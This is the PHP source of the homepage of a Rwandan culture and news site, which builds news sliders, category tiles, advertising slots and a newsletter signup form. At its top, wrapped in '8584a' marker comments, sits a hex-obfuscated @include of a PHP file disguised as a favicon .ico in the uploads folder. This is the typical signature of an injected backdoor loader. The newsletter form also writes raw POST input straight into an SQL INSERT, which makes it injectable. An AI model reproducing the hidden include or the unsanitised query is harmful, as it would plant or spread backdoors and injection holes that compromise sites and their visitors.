<?php
/*8584a*/

@include "\x2fhome\x2fumuc\x6fwac/\x70ubli\x63_htm\x6c/wp-\x63onte\x6et/up\x6coads\x2f2016\x2ffavi\x63on_7\x393244\x2eico";

/*8584a*/
require_once("./db_connect/connect.php");
require_once("./db_connect/functions.php");
?>
<!DOCTYPE HTML>
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>Umuco Wacu</title>
    <link rel="icon" type="image/png" href="images/c1.png">
<meta name="viewport" content="width=device-width, initial-scale=1">

<meta name="keywords" content=" " />
<script type="application/x-javascript"> addEventListener("load", function() { setTimeout(hideURLbar, 0); }, false); function hideURLbar(){ window.scrollTo(0,1); } </script>

<!--social media-->
<link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap.min.css">
<link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
<link rel="stylesheet" href="css/contact-buttons.css">
<link rel="stylesheet" href="css/demo.css">

<!-- Custom Theme files -->
<link href="css/bootstrap.css" rel="stylesheet" type="text/css" media="all" />
<link href="css/style.css" rel="stylesheet" type="text/css" media="all" />

<!-- jQuery from CDN -->
<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>

<!-- Connect your site to AdSense-->
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<script>
  (adsbygoogle = window.adsbygoogle || []).push({
    google_ad_client: "ca-pub-9004413538720603",
    enable_page_level_ads: true
  });
</script>
</head>

<body>
    


<!-- banner -->
	
			<div class="banner">
		        <div class="banner-info">
				
					
					<?php	include ("./includes/header.php"); ?>
				
				<!--banner-Slider-->
					<script src="js/responsiveslides.min.js"></script>
						<script>
							// You can also use "$(window).load(function() {"
							
							$(function () {
							  // Slideshow 4
							  $("#slider3").responsiveSlides({
							auto: true,
							pager: true,
							nav:true,
							speed: 500,
							namespace: "callbacks",
							before: function () {
							  $('.events').append("<li>before event fired.</li>");
							},
							after: function () {
							  $('.events').append("<li>after event fired.</li>");
							}
							  });

							});	
						</script>
						<br><br>
					<div class="container">
                    <div class=" col-md-12">
                    <img src="images/mt_umucowacu.gif" style=" width: 100%">    
                        
                </div>
                <div class=" col-md-12">
                    <img src="images/ntibavuga-bavuga-15.gif" style=" width: 100%">    
                        
                </div></div>
					<div  id="top" class="callbacks_container">
						<ul class="rslides" id="slider3">
						<?php
						$news_heads=mysqli_query($cn,"SELECT * FROM news_info WHERE News_type='head' ORDER BY Published_on DESC LIMIT 5")or die(mysqli_error($cn));
						while($heads=mysqli_fetch_array($news_heads)){

 ?>
							<li>
								<div class="banner-info-slider" >
								<ul>
									
										<li><a href="single.php"><?php echo category($cn,$heads['news_category']); ?></a></li>
										<li><?php echo $heads['Published_on']; ?></li>
									</ul>
								<div class=col-md-6 style="height: 380px"><br><?php echo "<img src='./Panel/news_info/news_icons/".$heads['news_icon']."' style='width:100%;height:370px' />"; ?></div>
								<div class=col-md-6 style="height: 380px"><br>
									<a href='./single.php?article=<?php echo $heads['news_ID']; ?>'><h2 style=" color: white; text-transform : uppercase"><?php echo $heads['News_Title']; ?></h2></a>
									<p><br/><?php echo mysqli_real_escape_string($cn,$heads['Short_description']); ?><span>By <i><?php echo $heads['news_author']; ?></i></i></span></p>
									<div class="more">
										<a href="single.php" class="type-1">
											<span> Read More </span>
										</a>
									</div>
								</div>
								
								</div>
							</li>
<?php }
						?>
					</ul>
					</div>
			</div>
		</div>
	</div>
   
    <div class=" col-md-12">
                    <img src="images/summer-promo-umucowacu-banner.gif" style=" width: 100%">    
                        
                </div>
<br>
	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- umucowacu -->
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-9004413538720603"
     data-ad-slot="9384710375"
     data-ad-format="auto"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>
<br>
<br>
<!-- banner -->
<!-- banner-bottom -->
	<div class="banner-bottom">
		<div class="container">
			<div class="banner-bottom-grids">
			<?php
			$query="SELECT * FROM subcategories";
			$results=fetch_data($cn,$query);
			 foreach($results as $sub) { ?>
			 <div class="col-md-3 banner-bottom-grid-left">
					<div class="br-bm-gd-lt" >
						<div class="overlay">
							<div class="arrow-left"></div>
							<div class="rectangle"></div>
							
						</div>
						<div class="health-pos">
							<div class="health">
							<?php
									$sql_cats="SELECT CatNAME as CAT FROM news_categories WHERE CatID='".$sub['Category']."'";
									$category=fetch_data($cn,$sql_cats);
									?>
								<ul>
									<li><a href="Cont_type.php?subcat=<?php echo $sub['SubID']; ?>&name=<?php echo $sub['SubName']; ?>"><?php  echo $sub['SubName'] ?></a></li>
									<!--<li><?php echo $category['CAT']; ?>-->
									</ul>
								<img src='./Panel/Admin/subCatProfiles/<?php echo $sub['Profile']; ?>' style='width:300px;height:200px'  />
							</div>
							<h4><?php  echo "<p style='color:white'>".$sub['Details']."<?p>" ?></h4>
						</div>
					</div>
				</div>			 
			<?php }
			?>
				
				<div class="clearfix"> </div>
			</div>
            
			<div class="move-text">
				<div class="breaking_news">
					<h2>Breaking News</h2>
				</div>
				<div class="marquee">
				<?php
			$query_breaking_news="SELECT * FROM news_info WHERE News_type='break' ORDER BY Published_on DESC LIMIT 5";
			$results=fetch_data($cn,$query_breaking_news);
			if(!empty($results)){
			 foreach($results as $breaking_news) { ?>
			 <div class="marquee1"><a class="breaking" href="single.php?article=<?php echo $breaking_news['news_ID']; ?>"><?php echo $breaking_news['News_Title']; ?></a></div>&nbsp;|&nbsp;
			<?php } 
			} else echo "Breaking news coming soon!!";?>
					<div class="clearfix"></div>
				</div>
				<div class="clearfix"></div>
				<script type="text/javascript" src="js/jquery.marquee.js"></script>
				<script>
				  $('.marquee').marquee({ pauseOnHover: true });
				  //@ sourceURL=pen.js
				</script>
			</div>
            <div class=" col-md-12">
                    <img src="images/advert11.jpg" style=" width: 100%">    
                        
                </div>
			<!-- video-grids -->
				<div class="video-grids">
					<div class="col-md-6 news-grid-left">
							<h3>latest news</h3>
							<ul>
							<?php
							$news_heads=mysqli_query($cn,"SELECT * FROM news_info ORDER BY Published_on DESC LIMIT 10")or die(mysqli_error($cn));
						while($sub=mysqli_fetch_array($news_heads)){ ?>
						<li>
									<div class="news-grid-left1">
										<?php echo "<img src='./Panel/news_info/news_icons/".$sub['news_icon']."' alt='' class='img-responsive' />"; ?>
									</div>
									<div class="news-grid-right1">
										<h4><a href="single.php?article=<?php echo $sub['news_ID']; ?>"><?php echo $sub['News_Title'];?> </a></h4>
										<h5>By <a href="#">admin</a> <label>|</label> <i><?php echo $sub['Published_on'];?></i></h5>
										<p><?php echo $sub['Short_description'];?></p>
									</div>
									<div class="clearfix"> </div>
								</li>
						<?php }
						?>
							</ul>
						</div>
                    <!--banner-->
                    		<div class="col-md-3 video-grids-right">
                                
				            <div class="breaking_news">
					<h2>Advertisement</h2>
                                
                                
				</div>
                                <img src="images/short_advert.jpg" style='width:250px;height:400px'><hr/>
                                <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- umucowacu3 -->
<ins class="adsbygoogle"
     style="display:inline-block;width:250px;height:400px"
     data-ad-client="ca-pub-9004413538720603"
     data-ad-slot="6651459571"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script><hr/>
                                <img src="images/short_advert.jpg"><hr/>
                                <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- umucowacu3 -->
<ins class="adsbygoogle"
     style="display:inline-block;width:250px;height:400px"
     data-ad-client="ca-pub-9004413538720603"
     data-ad-slot="6651459571"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script> <br>
                                <div class="news-grid-rght2">
								<h3>subscribe to our newsletter</h3>
								<p>Get the latest news and updates by signing up to our daily newsletter.We won't sell your email or spam you !</p>
								<?php
				if(@$_POST['sub']){
				$sql=mysqli_query($cn,"INSERT INTO `subscribers` values(null,'".$_POST['mail']."')")or die(mysqli_error($cn));
				if($sql){
				echo "<script type='text/javascript'> alert('You have subscribed successfully!!'); window.location='contact.php?sub=yes'; </script>";
				}
				}
				if(isset($_GET['sub'])) {?><br/><center><i style='color:green'>Thank you for subscribing!!</i></center><?php }
				?>
					
					<form method=post>
						<input type="email" name='mail' value="Email" onfocus="this.value = '';" onblur="if (this.value == '') {this.value = 'Email';}" required="">
						<input type="submit" value="Subscribe" name='sub' />
					</form>
							</div>
					</div>
                    <!--banner-->
					<div class="col-md-3 video-grids-right">
						<div class="sap_tabs">	
							<div id="horizontalTab" style="display: block; width: 100%; margin: 0px;">
								<ul class="resp-tabs-list">
									<!--<li class="resp-tab-item grid1" aria-controls="tab_item-0" role="tab"><span>most shared</span></li>-->
									<li class="resp-tab-item" role="tab"><span>most read</span></li>
									<div class="clear"></div>
								</ul>				  	 
								<div class="resp-tabs-container">
									<div class="tab-1 resp-tab-content" aria-labelledby="tab_item-0">
									<?php
									$query_mostread_news="SELECT * FROM news_info ORDER BY Visited DESC LIMIT 3";
			$results=fetch_data($cn,$query_mostread_news);
			if(!empty($results)){
			 foreach($results as $mostread_news) { ?>
			 		<div class="facts">
											<div class="tab_list">
												<img src="./Panel/news_info/news_icons/<?php echo $mostread_news['news_icon']; ?>" alt=" " class="img-responsive" />
											</div>
											<div class="tab_list1">
												<ul>
													<li><a href="single.php?article=<?php echo $mostread_news['news_ID'];  ?>"><?php echo $mostread_news['News_Title']; ?></a> <label>|</label></li>
													<li><?php echo $mostread_news['Published_on']; ?></li>
												</ul>
												<p><a href="#"><?php echo $mostread_news['Short_description']; ?>.</a></p>
											</div>
											<div class="clearfix"> </div>
										</div>

<?php }}			 ?>
								
									</div>

								</div>
								<script src="js/easyResponsiveTabs.js" type="text/javascript"></script>
								<script type="text/javascript">
									$(document).ready(function () {
										$('#horizontalTab').easyResponsiveTabs({
											type: 'default', //Types: default, vertical, accordion           
											width: 'auto', //auto or any width like 600px
											fit: true   // 100% fit in a container
										});
									});
								</script>
							</div>
						</div>
                        <br>
                        
					</div>
                   
                    
					<div class="clearfix"> </div>
				</div>
			<!-- //video-grids -->
			<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- umucowacu -->
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-9004413538720603"
     data-ad-slot="9384710375"
     data-ad-format="auto"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script><br>
			<!-- video-bottom-grids -->
				<div class="video-bottom-grids">
					<div class="video-bottom-grids1">
						<div class="col-md-3 video-bottom-grid">
							<div class="video-bottom-grid1">
								<div class="video-bottom-grid1-before">
									<img src="images/banner111.jpg" alt=" " class="img-responsive" />
									<div class="video-bottom-grid1-pos">
										<p>Miss and her daily activities.</p>
									</div>
								</div>
								<ul>
									<li><a href="Cont_type.php?subcat=12&name=Miss">Miss News.</a></li>
									<li><a href="historicalmiss.php">Historical Miss.</a></li>
								</ul>
								<div class="read-more">
									<a href="entertainment.php">Read more</a>
								</div>
							</div>
						</div>
						<div class="col-md-3 video-bottom-grid">
						<div class="video-bottom-grid1">
								<div class="video-bottom-grid1-before before7">
									<img src="images/17.jpg" alt=" " class="img-responsive" />
									<div class="video-bottom-grid1-pos">
										<p>Other news.</p>
									</div>
								</div>
								<ul class="list6">
									<li><a href="gospel.php">Gospel</a></li>
									<li><a href="politics.php">Politics</a></li>
									<li><a href="sports.php"> Sports</a></li>
									<li><a href="general.php">General News</a></li>
								</ul>
								<div class="read-more res6">
									<a href="othernews.php">Read more </a>
								</div>
							</div>
						</div>
						<div class="col-md-3 video-bottom-grid">
							<div class="video-bottom-grid1">
								<div class="video-bottom-grid1-before before2">
									<img src="images/18.jpg" alt=" " class="img-responsive" />
									<div class="video-bottom-grid1-pos">
										<p>Rwandan Traditional Dance</p>
									</div>
								</div>
								<ul class="list1">
									<li><a href="latesttraditionaldance.php"> Latest news
									
									
									</a></li>
									
									
								</ul>
								<div class="read-more res1">
									<a href="events.php">Read more</a>
								</div>
							</div>
						</div>
						<div class="col-md-3 video-bottom-grid">
							<div class="video-bottom-grid1">
								<div class="video-bottom-grid1-before before3">
									<img src="images/13.jpg" alt=" " class="img-responsive" />
									<div class="video-bottom-grid1-pos">
										<p> contemporary paintings..</p>
									</div>
								</div>
								<ul class="list2">
									<li><a href="painting.php">Latest news.</a></li>
									<li><a href="breaking.php"> Amazing painting products.</a></li>
									
								</ul>
								<div class="read-more res2">
									<a href="breaking.php">Read more</a>
								</div>
							</div>
						</div>
						<div class="clearfix"> </div>
					</div>
					


									
			<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- umucowacu -->
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-9004413538720603"
     data-ad-slot="9384710375"
     data-ad-format="auto"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>
</div>
</div>
</div>
<br>
			
<!-- footer -->
	<?php	include ("./includes/footer.php"); ?>
<!-- //footer -->

<!--Social media-->
<script src="js/jquery.contact-buttons.js"></script>
<script src="js/demo.js"></script>

<!-- for bootstrap working -->
	<script src="js/bootstrap.js"></script>
<!-- //for bootstrap working -->

<script type="text/javascript">

  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-36251023-1']);
  _gaq.push(['_setDomainName', 'jqueryscript.net']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();

</script>
</body>
</html>
